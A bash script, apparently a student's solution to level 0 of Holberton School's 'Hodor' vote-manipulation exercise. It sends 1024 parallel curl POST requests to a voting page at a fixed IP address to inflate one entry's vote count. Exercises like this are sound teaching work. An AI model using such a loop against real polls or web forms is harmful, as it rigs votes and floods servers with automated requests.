#!/bin/bash

# ===---Hodor level 0-------------------------------------------------------------===
# Solution in Shell Script for Hodor Project by Julien Barbier.
# Using curl command.
# If you want to see more details about each request replace the "s" option with "v"
# right after the 'curl' command.
# by Alexandro de Oliveira, for Holberton School.
# ===-----------------------------------------------------------------------------===

URL=http://173.246.108.142/level0.php
AGENT='havk64 - Curl requests'
ID='23'
COUNT=0
VOTES=$((1 << 10)) # Bitwise operation which results in 1024.



### Voting 1024 times:
while [ $COUNT -lt $VOTES ]
do
    curl -s -d "id=$ID&holdthedoor=submit" -A "$AGENT"  $URL -o /dev/null &
    echo "Vote: "$(($COUNT + 1))
    ((COUNT++))
done


